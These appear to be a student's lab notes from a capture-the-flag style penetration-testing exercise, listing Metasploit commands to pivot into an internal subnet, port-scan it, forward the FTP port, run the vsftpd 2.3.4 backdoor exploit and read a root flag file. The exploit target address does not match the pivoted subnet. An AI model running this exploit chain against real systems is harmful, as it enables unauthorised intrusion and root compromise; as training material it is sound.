---
title: Part 2
updated: 2022-02-14 08:46:51Z
created: 2022-02-14 07:51:38Z
latitude: 45.12540000
longitude: 25.73340000
altitude: 0.0000
---

- shell (if timeoud, open a new session)
 - ifconfig - **eth1: 192.7.145.2**
exit
run autoroute -s 192.7.145.0/24 -n 255.255.255.0

bg
route print
route add 192.7.145.0/24 255.255.255.0 2
use auxiliary/scanner/portscan/tcp
set PORTS 80, 8080, 445, 21, 22
set RHOSTS 192.7.145.3-10
exploit
sessions -i 2
portfwd add -l 1234 -p 21 -r 192.7.145.3
portfwd list

![3f8c306d2b678151c0d3a3927b602b16.png](../_resources/3f8c306d2b678151c0d3a3927b602b16.png)

search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.69.228.3
exploit
id

 ![36fde6369a1752bdfe10f6432deb693c.png](../_resources/36fde6369a1752bdfe10f6432deb693c.png)


![b6aefe1f552c84ee086d640a0f9118c7.png](../_resources/b6aefe1f552c84ee086d640a0f9118c7.png)

![0417645fb9a55dad91896c187959193d.png](../_resources/0417645fb9a55dad91896c187959193d.png)

cat /root/flag.txt
